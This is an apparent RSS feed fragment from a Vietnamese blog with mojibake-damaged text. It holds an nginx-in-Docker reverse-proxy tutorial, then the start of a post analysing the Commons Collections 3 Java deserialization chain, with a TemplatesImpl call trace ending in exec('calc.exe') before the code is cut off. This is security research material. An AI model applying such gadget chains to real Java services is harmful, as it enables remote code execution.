      <content:encoded><![CDATA[<h2 id="Cau-hinh"><a href="#Cau-hinh" class="headerlink" title="Cáº¥u hÃ¬nh"></a>Cáº¥u hÃ¬nh</h2><p>YÃªu cáº§u: </p><ul><li>Sá»­ dá»¥ng HDH linux, á»Ÿ Ä‘Ã¢y mÃ¬nh dÃ¹ng Ubuntu.</li><li>CÃ i Ä‘áº·t docker</li><li>CÃ i Ä‘áº·t node.js vÃ  npm</li></ul><h2 id="Docker-amp-nginx-co-ban"><a href="#Docker-amp-nginx-co-ban" class="headerlink" title="Docker &amp; nginx cÆ¡ báº£n"></a>Docker &amp; nginx cÆ¡ báº£n</h2><p>Äá»ƒ thuáº­n tiá»‡n, á»Ÿ Ä‘Ã¢y mÃ¬nh xÃ¢y dá»±ng nginx trÃªn docker. Báº¡n nÃ o chÆ°a biáº¿t dÃ¹ng docker thÃ¬ cÃ³ thá»ƒ xem bÃ i viáº¿t cÅ© cá»§a mÃ¬nh á»Ÿ <a href="https://rayinaw.github.io/2022/12/03/docker-learning/">Ä‘Ã¢y</a>.</p><p>Cáº¥u trÃºc file:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€â”€ docker-compose.yml</span><br><span class="line">â””â”€â”€ reverse_proxy</span><br><span class="line">    â””â”€â”€ nginx.conf</span><br></pre></td></tr></table></figure><p>Ná»™i dung file <code>docker-compose.yml</code>:</p><ul><li>Nginx lÃ  má»™t mÃ¡y chá»§ web Ä‘Æ°á»£c cáº¥u hÃ¬nh báº±ng táº­p tin <code>nginx.conf</code>, file cáº¥u hÃ¬nh nginx thÆ°á»ng Ä‘Æ°á»£c Ä‘áº·t trong <code>/etc/nginx/nginx.conf</code>. Cho nÃªn chÃºng ta cáº§n copy file <code>nginx.conf</code> vÃ o <code>/etc/nginx/nginx.conf</code> á»Ÿ volumes trong <code>docker-compose.yml</code> file.</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">reverse-proxy:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.23.4</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">reverse_proxy_demo</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./reverse_proxy/nginx.conf:/etc/nginx/nginx.conf</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">80</span><span class="string">:80</span></span><br></pre></td></tr></table></figure><p>Ná»™i dung file <code>nginx.conf</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">user nginx;</span><br><span class="line">worker_processes auto;</span><br><span class="line"></span><br><span class="line">error_log /var/log/nginx/error.log notice;</span><br><span class="line">pid /var/run/nginx.pid;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections 1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include /etc/nginx/mime.types;</span><br><span class="line">    default_type application/octet-stream;</span><br><span class="line"></span><br><span class="line">    log_format main &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">        &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">        &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    access_log /var/log/nginx/access.log main;</span><br><span class="line"></span><br><span class="line">    sendfile on;</span><br><span class="line">    keepalive_timeout 65;</span><br><span class="line">    # Ta chá»‰ cáº§n táº­p trung vÃ o cáº¥u hÃ¬nh server nÃ y.</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name localhost;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            return 200 &quot;Hello World&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Khá»Ÿi cháº¡y: <code>docker compose up -d</code> hoáº·c náº¿u báº¡n Ä‘Ã£ cÃ i gÃ³i docker-compose thÃ¬ dÃ¹ng <code>docker-compose up -d</code>.</p><p>DÃ¹ng <code>docker ps</code> Ä‘á»ƒ xem container Ä‘ang cháº¡y. NÃ³ Ä‘Ã£ cháº¡y trÃªn port 80, bÃ¢y giá» truy cáº­p <code>localhost:80</code> Ä‘á»ƒ xem káº¿t quáº£.</p><p>Uke, server Ä‘Ã£ cháº¡y nhÆ°ng chá»‰ Ä‘Æ¡n giáº£n lÃ  tráº£ vá» file cÃ³ ná»™i dung <code>Hello World</code>. Ta cÃ¹ng há»c tiáº¿p nhÃ©~</p><p>Cháº¡y <code>docker compose down</code> Ä‘á»ƒ gá»¡ container Ä‘i, náº¿u báº¡n cÃ³ cÃ i nhá»¯ng container khÃ¡c mÃ  khÃ´ng muá»‘n máº¥t thÃ¬ nhá»› chá»‰ Ä‘á»‹nh Ä‘Ãºng container Ä‘á»ƒ gá»¡, á»Ÿ Ä‘Ã¢y lÃ  <code>docker compose down reverse_proxy_demo</code></p><h3 id="Render-html-file"><a href="#Render-html-file" class="headerlink" title="Render html file"></a>Render html file</h3><p>Táº¡o thÃªm file html&#x2F;index.html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello world!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>CÃ¢y thÆ° má»¥c: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€â”€ docker-compose.yml</span><br><span class="line">â”œâ”€â”€ html</span><br><span class="line">â”‚Â Â  â””â”€â”€ index.html</span><br><span class="line">â””â”€â”€ reverse_proxy</span><br><span class="line">    â””â”€â”€ nginx.conf</span><br></pre></td></tr></table></figure><p>ÄÆ°a thÆ° má»¥c html vÃ o container:</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">reverse-proxy:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.23.4</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">reverse_proxy_demo</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./reverse_proxy/nginx.conf:/etc/nginx/nginx.conf</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./html:/html</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">80</span><span class="string">:80</span></span><br></pre></td></tr></table></figure><p>Náº¯m má»™t xÃ­u vá» chá»‰ thá»‹ <code>root</code> trong nginx:</p><ul><li>Chá»‰ thá»‹ root Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ chá»‰ Ä‘á»‹nh Ä‘Æ°á»ng dáº«n tá»›i thÆ° má»¥c gá»‘c (root directory) chá»©a cÃ¡c táº­p tin tÄ©nh (vÃ­ dá»¥: cÃ¡c táº­p tin HTML, CSS, JavaScript, hÃ¬nh áº£nh, v.v.) Ä‘Æ°á»£c phá»¥c vá»¥ bá»Ÿi Nginx.</li><li>Náº¿u báº¡n Ä‘áº·t <code>root /html</code>; trong cáº¥u hÃ¬nh Nginx, thÃ¬ khi cÃ³ yÃªu cáº§u truy cáº­p Ä‘áº¿n server, Nginx sáº½ tÃ¬m kiáº¿m cÃ¡c táº­p tin tÄ©nh trong thÆ° má»¥c &#x2F;html Ä‘á»ƒ phá»¥c vá»¥ cho yÃªu cáº§u Ä‘Ã³.</li></ul><p>Chá»‰nh sá»­a file <code>nginx.conf</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name localhost;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root /html;</span><br><span class="line">        index index.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Hoáº·c chÃºng ta cÃ³ thá»ƒ Ä‘áº·t Ä‘Æ°á»ng dáº«n root cho toÃ n bá»™ server:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    root /html;</span><br><span class="line">    server_name localhost;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        index index.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Khá»Ÿi cháº¡y <code>docker compose up -d</code>. Truy cáº­p <code>localhost</code>, file <code>index.html</code> Ä‘Ã£ Ä‘Æ°á»£c khá»Ÿi cháº¡y trÃªn browser.</p><h3 id="Dat-chi-thi-error-page-de-xu-ly-404-not-Found"><a href="#Dat-chi-thi-error-page-de-xu-ly-404-not-Found" class="headerlink" title="Äáº·t chá»‰ thá»‹ error_page Ä‘á»ƒ xá»­ lÃ½ 404 not Found"></a>Äáº·t chá»‰ thá»‹ error_page Ä‘á»ƒ xá»­ lÃ½ 404 not Found</h3><p>ThÆ°á»ng thÃ¬ nÃ y cÅ©ng khÃ´ng cáº§n thiáº¿t láº¯m, nhÆ°ng mÃ¬nh cÃ³ thá»ƒ tá»± xá»­ lÃ½ <code>status 404</code> riÃªng.</p><p>ThÃªm file <code>404.html</code> vÃ o thÆ° má»¥c <code>html</code>.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>404 - Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>404 - Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Oh no bro, you&#x27;re going down a path that even a saint like me can&#x27;t handle.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ThÃªm chá»‰ thá»‹ <code>error_page</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    root /html;</span><br><span class="line">    server_name localhost;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        index index.html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page 404 /404.html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Khá»Ÿi cháº¡y: <code>docker compose up -d</code> (nhá»› <code>docker compose down</code> trÆ°á»›c nhÃ©).</p><p>Truy cáº­p <code>localhost/abjdkje</code>, trang lá»—i Ä‘Ã£ Ä‘Æ°á»£c Ä‘á»•i thÃ nh trang <code>404.html</code> cá»§a mÃ¬nh.</p><h3 id="Chi-thi-proxy-pass"><a href="#Chi-thi-proxy-pass" class="headerlink" title="Chá»‰ thá»‹ proxy_pass"></a>Chá»‰ thá»‹ proxy_pass</h3><p>CÃ´ng dá»¥ng cá»§a nginx lÃ  Ä‘iá»u hÆ°á»›ng ngÆ°á»i dÃ¹ng,â€¦ nÃªn <code>proxy_pass</code> lÃ  má»™t Ä‘iá»u mÃ  khÃ´ng thá»ƒ khÃ´ng nháº¯c Ä‘áº¿n.</p><p>MÃ¬nh sáº½ táº¡o má»™t <code>node.js</code> web app cÆ¡ báº£n Ä‘á»ƒ demo cho rÃµ nhÃ©.</p><p>ThÃªm thÆ° má»¥c <code>app</code>:</p><ul><li>Äi Ä‘áº¿n thÆ° má»¥c <code>app</code> gÃµ <code>npm init -y</code></li><li>Tiáº¿p theo cháº¡y lá»‡nh <code>npm install express</code></li><li>Táº¡o file <code>app.js</code>:<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Hello world!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server is running on http://localhost:<span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li>Táº¡o file <code>Dockerfile</code>:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">FROM node:14</span><br><span class="line"></span><br><span class="line">WORKDIR /app</span><br><span class="line"></span><br><span class="line">COPY package*.json /app</span><br><span class="line"></span><br><span class="line">RUN npm install</span><br><span class="line"></span><br><span class="line">COPY . /app</span><br><span class="line"></span><br><span class="line">EXPOSE 8080</span><br><span class="line"></span><br><span class="line">CMD [ &quot;node&quot;, &quot;app.js&quot; ]</span><br></pre></td></tr></table></figure></li></ul><p>Sau khi cháº¡y xong ta sáº½ cÃ³ cÃ¢y thÆ° má»¥c nhÆ° sau:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ app</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ node_modules</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ app.js</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ Dockerfile</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ package.json</span><br><span class="line">â”‚Â Â  â””â”€â”€ package-lock.json</span><br><span class="line">â”œâ”€â”€ docker-compose.yml</span><br><span class="line">â”œâ”€â”€ html</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ 404.html</span><br><span class="line">â”‚Â Â  â””â”€â”€ index.html</span><br><span class="line">â””â”€â”€ reverse_proxy</span><br><span class="line">    â””â”€â”€ nginx.conf</span><br></pre></td></tr></table></figure><p>Chá»‰nh sá»­a <code>docker-compose.yml</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">version: &#x27;3&#x27;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  node-app:</span><br><span class="line">    build: ./app</span><br><span class="line">    container_name: node_app_demo</span><br><span class="line">    ports:</span><br><span class="line">      - 8080:8080</span><br><span class="line">  reverse-proxy:</span><br><span class="line">    image: nginx:1.23.4</span><br><span class="line">    container_name: reverse_proxy_demo</span><br><span class="line">    volumes:</span><br><span class="line">      - ./reverse_proxy/nginx.conf:/etc/nginx/nginx.conf</span><br><span class="line">      - ./html:/html</span><br><span class="line">    ports:</span><br><span class="line">      - 80:80</span><br><span class="line">    depends_on:</span><br><span class="line">      - node-app</span><br></pre></td></tr></table></figure><p>Notes:</p><ul><li>Trong má»™t mÃ´i trÆ°á»ng Docker Compose, cÃ¡c dá»‹ch vá»¥ (services) Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a trong docker-compose.yml Ä‘Æ°á»£c xem nhÆ° cÃ¡c tÃªn miá»n. Khi báº¡n Ä‘áº·t tÃªn cho dá»‹ch vá»¥ trong docker-compose.yml (vÃ­ dá»¥: node-app), Docker Compose sáº½ táº¡o má»™t máº¡ng máº·c Ä‘á»‹nh giá»¯a cÃ¡c dá»‹ch vá»¥ vÃ  sá»­ dá»¥ng tÃªn cá»§a dá»‹ch vá»¥ Ä‘Ã³ lÃ m tÃªn miá»n Ä‘á»ƒ chÃºng cÃ³ thá»ƒ giao tiáº¿p vá»›i nhau.</li><li>Äá»ƒ nginx chuyá»ƒn hÆ°á»›ng Ä‘áº¿n <code>node-app</code> thÃ¬ chÃºng ta pháº£i set tÃªn miá»n lÃ  <code>http://node-app:8080</code> tuy nhiÃªn do á»Ÿ Ä‘Ã¢y mÃ¬nh Ä‘áº·t tÃªn láº¡i cho container lÃ  <code>node_app_demo</code> nÃªn chÃºng ta sáº½ set lÃ  <code>http://node_app_demo:8080</code>. </li><li>Náº¿u chÃºng ta Ä‘áº·t lÃ  <code>http://localhost:8080</code> thÃ¬ nginx sáº½ chuyá»ƒn hÆ°á»›ng Ä‘áº¿n localhost cá»§a container nginx chá»© khÃ´ng pháº£i lÃ  <code>node_app_demo</code>.</li></ul><p>Cáº¥u hÃ¬nh láº¡i <code>nginx.conf</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name localhost;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass http://node_app_demo:8080;</span><br><span class="line">            proxy_set_header Host $host;</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        error_page 404 /404.html;</span><br><span class="line">        </span><br><span class="line">        location /404.html &#123;</span><br><span class="line">            root /html;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Vá»›i cáº¥u hÃ¬nh trÃªn, khi ngÆ°á»i dÃ¹ng truy cáº­p Ä‘áº¿n <code>http://localhost/</code> thÃ¬ nginx sáº½ Ä‘iá»u hÆ°á»›ng Ä‘áº¿n container <code>node_app_demo</code>.</p><p>Khá»Ÿi cháº¡y: <code>docker compose up -d</code></p><p>ThÆ° má»¥c cá»§a mÃ¬nh Ä‘á»ƒ á»Ÿ <a href="https://github.com/rayinaw/DevOpsLearning">Ä‘Ã¢y</a></p>]]></content:encoded>
      
      
      <category domain="https://rayinaw.github.io/categories/DevOps/">DevOps</category>
      
      <category domain="https://rayinaw.github.io/categories/DevOps/Nginx/">Nginx</category>
      
      <category domain="https://rayinaw.github.io/categories/DevOps/Nginx/Docker/">Docker</category>
      
      
      <category domain="https://rayinaw.github.io/tags/Docker/">Docker</category>
      
      <category domain="https://rayinaw.github.io/tags/DevOps/">DevOps</category>
      
      <category domain="https://rayinaw.github.io/tags/Nginx/">Nginx</category>
      
      
      <comments>https://rayinaw.github.io/2023/04/15/nginx-learning/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>PhÃ¢n tÃ­ch chuá»—i Commons Collections 3</title>
      <link>https://rayinaw.github.io/2023/03/20/CommonsCollections3/</link>
      <guid>https://rayinaw.github.io/2023/03/20/CommonsCollections3/</guid>
      <pubDate>Mon, 20 Mar 2023 14:46:42 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Mot-vai-kien-thuc-can-nam&quot;&gt;&lt;a href=&quot;#Mot-vai-kien-thuc-can-nam&quot; class=&quot;headerlink&quot; title=&quot;Má»™t vÃ i kiáº¿n thá»©c cáº§n náº¯m&quot;&gt;&lt;/a&gt;Má»™t vÃ i kiáº¿</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Mot-vai-kien-thuc-can-nam"><a href="#Mot-vai-kien-thuc-can-nam" class="headerlink" title="Má»™t vÃ i kiáº¿n thá»©c cáº§n náº¯m"></a>Má»™t vÃ i kiáº¿n thá»©c cáº§n náº¯m</h2><p>BÃ i viáº¿t nÃ y mÃ¬nh sá»­ dá»¥ng template tá»« 3 bÃ i viáº¿t trÆ°á»›c vá» CC1-Lazymap, cc1-TransformedMap vÃ  CC2 nÃªn Ä‘á»ƒ cÃ³ thá»ƒ hiá»ƒu Ä‘Æ°á»£c cÃ¡c báº¡n nÃªn Ä‘á»c 3 bÃ i kia trÆ°á»›c nhÃ©.</p><h2 id="Moi-truong"><a href="#Moi-truong" class="headerlink" title="MÃ´i trÆ°á»ng"></a>MÃ´i trÆ°á»ng</h2><ul><li>JDK8u65</li><li>Commons-Collections 3.2.1<br>ThÃªm Commons-Collections 3.2.1 vÃ o project báº±ng dependencies (pom.xml file):<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.25.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="PhÃ¢n tÃ­ch"></a>PhÃ¢n tÃ­ch</h2><p>SÆ¡ Ä‘á»“ tÃ³m táº¯t chuá»—i.<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/mindmap.png"></p><p>CC2, CC3, CC4 Ä‘á»u Ä‘Æ°á»£c xÃ¢y dá»±ng dá»±a trÃªn TemplateImpl. MÃ¬nh Ä‘Ã£ xÃ¢y dá»±ng pháº§n nÃ y á»Ÿ bÃ i viáº¿t vá» cc3, nÃªn bÃ i nÃ y mÃ¬nh sáº½ sá»­ dá»¥ng láº¡i nÃ³.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">TemplatesImpl.getTransletInstance()</span><br><span class="line">TemplatesImpl.defineTransletClasses()</span><br><span class="line">TransletClassLoader.defineClass()</span><br><span class="line">TemplatesImpl.getTransletInstance()-&gt;_class[_transletIndex].newInstance()</span><br><span class="line">Runtime.getRuntime().exec(&quot;calc.exe&quot;)</span><br></pre></td></tr></table></figure><p>Äoáº¡n code trigger lá»›p TemplatesImpl:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> 